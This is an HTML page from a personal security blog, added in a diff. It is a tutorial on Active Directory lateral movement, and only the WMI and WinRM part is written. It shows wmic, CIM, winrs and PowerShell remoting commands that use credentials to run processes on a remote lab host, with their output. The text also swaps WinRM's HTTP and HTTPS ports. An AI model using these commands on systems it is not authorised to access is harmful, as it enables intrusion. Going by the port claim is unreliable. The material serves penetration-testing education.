@@ -1,0 +1,511 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+
+
+
+
+
+
+
+
+
+
+    
+
+
+
+
+
+
+
+<script defer language="javascript" type="text/javascript" src="/js/bundle.min.5991d603939a6d188be342b278a4555db90f163903158c623d2c39fde3d82cb3.js"></script>
+
+
+
+
+
+
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    
+    <link rel="icon" href=/favicon.png>
+
+    
+    
+
+
+
+
+
+  
+
+
+
+
+
+  
+  
+  
+
+
+<!-- Open Graph image and Twitter Card metadata -->
+
+<title itemprop="name">Patrick Hammes - AD - Lateral Movement Techniques</title>
+<meta property="og:title" content=Patrick&#32;Hammes&#32;-&#32;AD&#32;-&#32;Lateral&#32;Movement&#32;Techniques />
+<meta name="twitter:title" content=Patrick&#32;Hammes&#32;-&#32;AD&#32;-&#32;Lateral&#32;Movement&#32;Techniques />
+<meta itemprop="name" content=Patrick&#32;Hammes&#32;-&#32;AD&#32;-&#32;Lateral&#32;Movement&#32;Techniques />
+<meta name="application-name" content=Patrick&#32;Hammes&#32;-&#32;AD&#32;-&#32;Lateral&#32;Movement&#32;Techniques />
+<meta property="og:site_name" content="" />
+
+
+<meta name="description" content="" />
+<meta itemprop="description" content="" />
+<meta property="og:description" content="" />
+<meta name="twitter:description" content="" />
+
+
+<base href="//localhost:1313/posts/lateralmovement/" />
+<link rel="canonical" href="//localhost:1313/posts/lateralmovement/" itemprop="url" />
+<meta name="url" content="//localhost:1313/posts/lateralmovement/" />
+<meta name="twitter:url" content="//localhost:1313/posts/lateralmovement/" />
+<meta property="og:url" content="//localhost:1313/posts/lateralmovement/" />
+
+
+<meta property="og:updated_time" content="2025-05-16T00:00:00Z" />
+
+
+<link rel="sitemap" type="application/xml" title="Sitemap" href='//localhost:1313/sitemap.xml' />
+
+<meta name="robots" content="index,follow" />
+<meta name="googlebot" content="index,follow" />
+
+
+
+  
+    <meta name="twitter:site" content="@hatrickkkkk" />
+    <meta name="twitter:creator" content="@hatrickkkkk" />
+
+<meta property="fb:admins" content="" />
+
+
+<meta name="apple-mobile-web-app-title" content="" />
+<meta name="apple-mobile-web-app-capable" content="yes" />
+<meta name="apple-mobile-web-app-status-bar-style" content="black" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.145.0">
+
+
+    
+    
+
+<link type="text/css" rel="stylesheet" href="/css/bundle.min.94a339836f89f0d25f31980cb6b0631da21e20af128308747ce44e0525eb16ef.css">
+
+
+    
+    <style>
+    body {
+        --sidebar-bg-color: #202020;
+        --sidebar-img-border-color: #515151;
+        --sidebar-p-color: #909090;
+        --sidebar-h1-color: #FFF;
+        --sidebar-a-color: #FFF;
+        --sidebar-socials-color: #FFF;
+        --text-color: #222;
+        --bkg-color: #FAF9F6;
+        --post-title-color: #303030;
+        --list-color: #5A5A5A;
+        --link-color: #268BD2;
+        --date-color: #515151;
+        --table-border-color: #E5E5E5;
+        --table-stripe-color: #F9F9F9;
+        --code-color: #000;
+        --code-background-color: #E5E5E5;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+        --moon-sun-color: #FFF;
+        --moon-sun-background-color: #515151;
+    }
+    body.dark-theme {
+        --text-color: #EEE;
+        --bkg-color: #121212;
+        --post-title-color: #DBE2E9;
+        --list-color: #9D9D9D;
+        --link-color: #268BD2;
+        --date-color: #9A9A9A;
+        --table-border-color: #515151;
+        --table-stripe-color: #202020;
+        --code-color: #FFF;
+        --code-background-color: #515151;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+    }
+    body {
+        background-color: var(--bkg-color);
+    }
+</style>
+
+</head>
+
+    <body class="dark-theme">
+        <div class="wrapper">
+            <aside class="sidebar">
+    <div class="container sidebar-sticky">
+        <div class="light-dark" align="right">
+    <button class="btn-light-dark" title="Toggle light/dark mode">
+        <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M6 .278a.768.768 0 0 1 .08.858a7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277c.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316a.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71C0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
+        </svg>
+        <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M8 12a4 4 0 1 0 0-8a4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
+        </svg>
+    </button>
+</div>
+
+        <div class="sidebar-about">
+    <h1 class="brand">
+        
+            <a href="//localhost:1313/">
+                <img src="/images/pat.png" alt="brand image">
+            </a>
+        
+        
+            <a href="//localhost:1313/">
+                <h1>Patrick Hammes</h1>
+            </a>
+        
+    </h1>
+    <p class="lead">
+    Hacking stuff.
+    </p>
+</div>
+
+        <nav>
+    <ul class="sidebar-nav">
+
+        
+        
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/whoami/">Whoami</a>
+                    </li>
+                    
+                
+            
+            
+                
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+                    <li class="heading">
+                        <a href="/posts/">Posts</a>
+                    </li>
+                    
+                        <li class="sub-heading">
+                            
+                        </li>
+                        
+                            <li class="bullet">
+                                <a href="//localhost:1313/posts/escapetwo/">HackTheBox - EscapeTwo</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="//localhost:1313/posts/lateralmovement/">AD - Lateral Movement Techniques</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="//localhost:1313/posts/cicada/">HackTheBox - Cicada</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="//localhost:1313/posts/active/"></a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="//localhost:1313/posts/blackfield/"></a>
+                            </li>
+                        
+                    
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+
+    </ul>
+</nav>
+
+        
+
+
+    <a target="_blank" class="social" title="LinkedIn" href="https://www.linkedin.com/in/patrick-hammes/">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 448 512">
+            <path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5c0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7c-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5c67.2 0 79.7 44.3 79.7 101.9V416z"/>
+        </svg>
+    </a>
+
+
+
+    <a target="_blank" class="social" title="X" href="https://x.com/hatrickkkkk">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.1em" height="1.1em" viewBox="0 0 512 472.799">
+            <path fill="currentColor" d="M403.229 0h78.506L310.219 196.04 512 462.799H354.002L230.261 301.007 88.669 462.799h-78.56l183.455-209.683L0 0h161.999l111.856 147.88L403.229 0zm-27.556 415.805h43.505L138.363 44.527h-46.68l283.99 371.278z"/>
+        </svg>
+    </a>
+
+
+
+
+
+    <a target="_blank" class="social" title="Discord" href="https://discord.com">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 24 24">
+            <path fill="currentColor" d="M19.27 5.33C17.94 4.71 16.5 4.26 15 4a.09.09 0 0 0-.07.03c-.18.33-.39.76-.53 1.09a16.09 16.09 0 0 0-4.8 0c-.14-.34-.35-.76-.54-1.09c-.01-.02-.04-.03-.07-.03c-1.5.26-2.93.71-4.27 1.33c-.01 0-.02.01-.03.02c-2.72 4.07-3.47 8.03-3.1 11.95c0 .02.01.04.03.05c1.8 1.32 3.53 2.12 5.24 2.65c.03.01.06 0 .07-.02c.4-.55.76-1.13 1.07-1.74c.02-.04 0-.08-.04-.09c-.57-.22-1.11-.48-1.64-.78c-.04-.02-.04-.08-.01-.11c.11-.08.22-.17.33-.25c.02-.02.05-.02.07-.01c3.44 1.57 7.15 1.57 10.55 0c.02-.01.05-.01.07.01c.11.09.22.17.33.26c.04.03.04.09-.01.11c-.52.31-1.07.56-1.64.78c-.04.01-.05.06-.04.09c.32.61.68 1.19 1.07 1.74c.03.01.06.02.09.01c1.72-.53 3.45-1.33 5.25-2.65c.02-.01.03-.03.03-.05c.44-4.53-.73-8.46-3.1-11.95c-.01-.01-.02-.02-.04-.02zM8.52 14.91c-1.03 0-1.89-.95-1.89-2.12s.84-2.12 1.89-2.12c1.06 0 1.9.96 1.89 2.12c0 1.17-.84 2.12-1.89 2.12zm6.97 0c-1.03 0-1.89-.95-1.89-2.12s.84-2.12 1.89-2.12c1.06 0 1.9.96 1.89 2.12c0 1.17-.83 2.12-1.89 2.12z"/>
+        </svg>
+    </a>
+
+
+
+    <a target="_blank" class="social" title="Instagram" href="https://www.instagram.com/hatrickkkk/">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 448 512">
+            <path fill="currentColor" d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9S287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7s74.7 33.5 74.7 74.7s-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8c-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8s26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9c-26.2-26.2-58-34.4-93.9-36.2c-37-2.1-147.9-2.1-184.9 0c-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9c1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0c35.9-1.7 67.7-9.9 93.9-36.2c26.2-26.2 34.4-58 36.2-93.9c2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6c-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6c-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6c29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6c11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z"/>
+        </svg>
+    </a>
+
+
+
+
+
+
+
+
+
+
+
+        <p class="footnote">
+powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a target="_blank" href="https://github.com/lukeorth/poison">poison</a>
+    <br>
+    &copy; 2025 . All rights reserved.
+</p>
+
+  </div>
+</aside>
+
+            <main class="content container">
+                <div class="post">
+  <div class="info">
+  <h1 class="post-title">
+    <a href="//localhost:1313/posts/lateralmovement/">AD - Lateral Movement Techniques</a>
+  </h1>
+
+  <div class="headline">
+    <div>
+      
+      
+      <time datetime=" 2025-05-16T00:00:00Z" class="post-date">
+        May 16, 2025
+      </time>
+      
+      <span> - </span>
+      <span class="reading-time">
+        
+          
+        
+
+        <span>3 mins read</span>
+      </span>
+    </div>
+
+    
+    <ul class="tags">
+      
+      <li class="tag-active directory">
+        <a href="//localhost:1313/tags/active-directory">active directory</a>
+      </li>
+      
+      <li class="tag-windows">
+        <a href="//localhost:1313/tags/windows">windows</a>
+      </li>
+      
+      <li class="tag-lateral movement">
+        <a href="//localhost:1313/tags/lateral-movement">lateral movement</a>
+      </li>
+      
+    </ul>
+    
+  </div>
+
+  
+  
+
+  
+</div>
+
+  <h1 id="active-directory---lateral-movement-techniques">ACTIVE DIRECTORY - Lateral Movement Techniques</h1>
+<p>Here, we&rsquo;ll take a look at lateral movement techniques in Active Directory envir/onments.</p>
+<h2 id="1-wmi-and-winrm">1. WMI and WinRM</h2>
+<h3 id="11-wmi">1.1 WMI</h3>
+<p>Windows Management Instrumentation (WMI) is capable of creating processes via the Create method from the Win32_Process class. It
+communicates through Remote Procedure Calls (RPC)1134 over port 135 for remote access and
+uses a higher-range port (19152-65535) for session data.</p>
+<p>In order to abuse a remote target via WMI, we need credentaisl of a member of the Administrator local group, which can be also a domain user.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\p</span>atrick&gt;wmic /node:192.168.40.21 /user:patrick /password:Cat123!@ process call
+</span></span><span style="display:flex;"><span>create <span style="color:#e6db74">&#34;calc&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> Executing <span style="color:#f92672">(</span>Win32_Process<span style="color:#f92672">)</span>-&gt;Create<span style="color:#f92672">()</span>
+</span></span><span style="display:flex;"><span> Method execution successful.
+</span></span><span style="display:flex;"><span> Out Parameters:
+</span></span><span style="display:flex;"><span> instance of __PARAMETERS
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span> ProcessId <span style="color:#f92672">=</span> 752;
+</span></span><span style="display:flex;"><span> ReturnValue <span style="color:#f92672">=</span> 0;
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">}</span>;
+</span></span></code></pre></div><p>The WMI job returned the PID of the newly created process and a return value of “0”, meaning that the process has been created successfully.</p>
+<p>Now we can do the same through powershell with few extra details. We&rsquo;ll need a PSCredential object that will store our session with username and password.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;patrick&#39;</span>;
+</span></span><span style="display:flex;"><span>$password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Cat123!@&#39;</span>;
+</span></span><span style="display:flex;"><span>$secureString <span style="color:#f92672">=</span> ConvertTo-SecureString $password -AsPlaintext -Force;
+</span></span><span style="display:flex;"><span>$credential <span style="color:#f92672">=</span> New-Object System.Management.Automation.PSCredential $username,
+</span></span><span style="display:flex;"><span>$secureString;
+</span></span></code></pre></div><p>Now, we want to create a Common Information Mode (CIM). We&rsquo;ll specify DCOM as the protocol for the WMI session, create new sessions against our target IP and supply the PSCredential object, then, define &lsquo;calc&rsquo; as the payload to be executed.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$options <span style="color:#f92672">=</span> New-CimSessionOption -Protocol DCOM
+</span></span><span style="display:flex;"><span>$session <span style="color:#f92672">=</span> New-Cimsession -ComputerName 192.168.40.21 -Credential $credential -SessionOption $Options
+</span></span><span style="display:flex;"><span>$command <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;calc&#39;</span>;
+</span></span></code></pre></div><p>In the final step, put all the pieces together, invoke the cmdlet <em>Invoke-CimMethod</em> and provide <strong>Win32_Process</strong> as Class name and <strong>Create</strong> as MethodName.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @<span style="color:#f92672">{</span>CommandLine <span style="color:#f92672">=</span>$Command<span style="color:#f92672">}</span>;
+</span></span></code></pre></div><p>This will launch a calculator process on target.</p>
+<h3 id="12-winrm">1.2 WinRM</h3>
+<p>As an alternative method to WMI for remote management, WinRM can be employed for remote hosts management. WinRM is the Microsoft version of the WS-Management protocol and it exchanges XML messages over HTTP and HTTPS. It uses TCP port 5985 for encrypted HTTPS traffic and port 5986 for plain HTTP.</p>
+<p>WinRM is implemented in numerous built-in utilities, such as winrs (Windows Remote Shell).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\p</span>atrick&gt;winrs -r:files01 -u:patrick -p:Cat123!@ <span style="color:#e6db74">&#34;cmd /c hostname &amp; whoami&#34;</span>
+</span></span><span style="display:flex;"><span>FILES01
+</span></span><span style="display:flex;"><span>corp<span style="color:#ae81ff">\p</span>atrick
+</span></span></code></pre></div><blockquote>
+<p>To WinRS work, the domain user needs to be part of the Administrators or Remote Management Users group on the target host.</p></blockquote>
+<p>PowerShell also has WinRM built-in capabilities called PowerShell remoting which can be invoked via the New-PSSession cmdlet by providing the IP of the target host along with the credentials in a credential object format similar to what we did previously.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\p</span>atricck&gt; $username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;patrick&#39;</span>;
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\p</span>atrick&gt; $password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Cat123!@&#39;</span>;
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\p</span>atrick&gt; $secureString <span style="color:#f92672">=</span> ConvertTo-SecureString $password -AsPlaintext -Force;
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\p</span>atrick&gt; $credential <span style="color:#f92672">=</span> New-Object System.Management.Automation.PSCredential
+</span></span><span style="display:flex;"><span>$username, $secureString;
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\p</span>atrick&gt; New-PSSession -ComputerName 192.168.40.21 -Credential $credential
+</span></span><span style="display:flex;"><span>Id Name ComputerName ComputerType State ConfigurationName Availability
+</span></span><span style="display:flex;"><span>-- ---- ------------ ------------ ----- ----------------- ------------
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> WinRM1 192.168.40.21 RemoteMachine Opened Microsoft.PowerShell Available
+</span></span></code></pre></div><p>Now, to interact with the open session, we need the cmdlet Enter-PSSession.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\p</span>atrick&gt; Enter-PSSession <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>192.168.40.21<span style="color:#f92672">]</span>: PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\p</span>atrick<span style="color:#ae81ff">\D</span>ocuments&gt; whoami corp<span style="color:#ae81ff">\p</span>atrick
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>192.168.40.21<span style="color:#f92672">]</span>: PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\p</span>atrick<span style="color:#ae81ff">\D</span>ocuments&gt; hostname FILES01
+</span></span></code></pre></div><p><strong>References to Dive Deeper:</strong></p>
+<p><a href="https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page" target="_blank">Microsoft WMI documentation</a></p>
+<p><a href="https://learn.microsoft.com/en-us/windows/win32/winrm/portal" target="_blank">Microsoft WinRM documentation</a></p>
+<p><strong>Red Team Tools:</strong></p>
+<p><a href="https://github.com/fortra/impacket" target="_blank">Impacket’s wmiexec.py</a></p>
+<p><a href="https://github.com/Hackplayers/evil-winrm" target="_blank">Evil-WinRM</a></p>
+<hr>
+<h2 id="2-psexec">2. PsExec</h2>
+<h2 id="3-pass-the-hash-pth">3. Pass The Hash (PtH)</h2>
+<h2 id="4-overpass-the-hash">4. Overpass the Hash</h2>
+<h2 id="5-pass-the-ticket">5. Pass the Ticket</h2>
+<h2 id="6-dcom">6. DCOM</h2>
+
+  
+  <hr>
+<div class="footer">
+    
+	    
+            <a class="previous-post" href="//localhost:1313/posts/cicada/?ref=footer"><span style="font-weight:bold;">« Previous</span><br>HackTheBox - Cicada</a>
+        
+	    
+            <div class="next-post">
+                <a href="//localhost:1313/posts/escapetwo/?ref=footer"><span style="font-weight:bold;">Next »</span><br>HackTheBox - EscapeTwo</a>
+            </div>
+        
+    
+</div>
+
+  
+</div>
+            </main>
+            
+  
+    <div class="article-toc ">
+    <div class="toc-wrapper">
+      <h4 id="contents"></h4>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-wmi-and-winrm">1. WMI and WinRM</a>
+      <ul>
+        <li><a href="#11-wmi">1.1 WMI</a></li>
+        <li><a href="#12-winrm">1.2 WinRM</a></li>
+      </ul>
+    </li>
+    <li><a href="#2-psexec">2. PsExec</a></li>
+    <li><a href="#3-pass-the-hash-pth">3. Pass The Hash (PtH)</a></li>
+    <li><a href="#4-overpass-the-hash">4. Overpass the Hash</a></li>
+    <li><a href="#5-pass-the-ticket">5. Pass the Ticket</a></li>
+    <li><a href="#6-dcom">6. DCOM</a></li>
+  </ul>
+</nav>
+    </div>
+</div>
+
+  
+
+        </div>
+    </body>
+</html>
